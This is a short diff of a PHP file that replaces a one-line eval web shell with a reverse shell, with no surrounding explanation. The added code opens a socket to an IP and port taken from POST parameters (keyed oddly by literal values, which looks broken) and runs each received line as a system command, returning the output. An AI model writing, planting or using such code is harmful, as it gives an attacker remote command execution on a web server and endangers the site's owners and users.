@@ -1,1 +1,17 @@
-<?php eval($_POST['key']);?>
+<?php 
+set_time_limit(0); 
+$ip=$_POST['192.168.126.1'];
+$port=$_POST['4567'];
+$fp=@fsockopen($ip,$port,$errno,$errstr);
+if(!$fp){echo "error";}
+else{
+	fputs($fp,"\n+++++++++++++connect sucess+++++++++\n");
+	while(!feof($fp)){
+	fputs($fp,"shell:");
+	$shell=fgets($fp);
+	$message=`$shell`;
+	fputs($fp,$message);
+	}
+fclose($fp);
+}
+?>
